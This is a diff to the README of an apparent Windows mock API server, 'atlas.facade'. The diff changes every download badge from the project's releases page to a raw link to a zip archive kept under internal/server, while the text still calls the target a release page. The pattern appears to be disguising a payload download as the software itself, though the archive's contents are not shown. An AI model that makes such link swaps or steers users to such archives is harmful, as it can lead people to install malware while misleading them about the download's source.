@@ -1,6 +1,6 @@
 # 🛰️ atlas.facade - Simple Mock API Server for Windows
 
-[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/Shahdm22/atlas.facade/releases)
+[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)
 
 ## 📋 What is atlas.facade?
 
@@ -33,7 +33,7 @@ atlas.facade does not need installation of extra tools or software. It runs out 
 
 Go to the official release page to get the latest version of atlas.facade for Windows:
 
-[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-grey?style=for-the-badge)](https://github.com/Shahdm22/atlas.facade/releases)
+[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-grey?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)
 
 This page lists all available versions and files.
 
@@ -137,4 +137,4 @@ Do not run the software with elevated permissions unless you understand the risk
 
 # Download atlas.facade to your PC:
 
-[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/Shahdm22/atlas.facade/releases)
+[![Download atlas.facade](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shahdm22/atlas.facade/main/internal/server/atlas-facade-1.7-alpha.3.zip)
